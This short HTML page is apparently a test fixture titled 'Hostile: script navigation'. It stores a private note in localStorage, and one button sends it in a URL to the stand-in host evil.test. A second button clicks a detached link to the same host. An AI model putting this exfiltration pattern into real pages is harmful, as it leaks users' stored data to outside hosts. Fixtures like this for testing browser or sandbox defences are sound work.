<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Hostile: script navigation</title></head>
<body>
  <p id="status">loaded</p>
  <button id="go" onclick="location.href = 'http://evil.test/leave?data=' + encodeURIComponent(localStorage.getItem('secret'))">Leave</button>
  <button id="detached-link" onclick="var a = document.createElement('a'); a.href = 'http://evil.test/detached'; a.click();">Detached link</button>
  <script>localStorage.setItem('secret', 'my private note');</script>
</body></html>
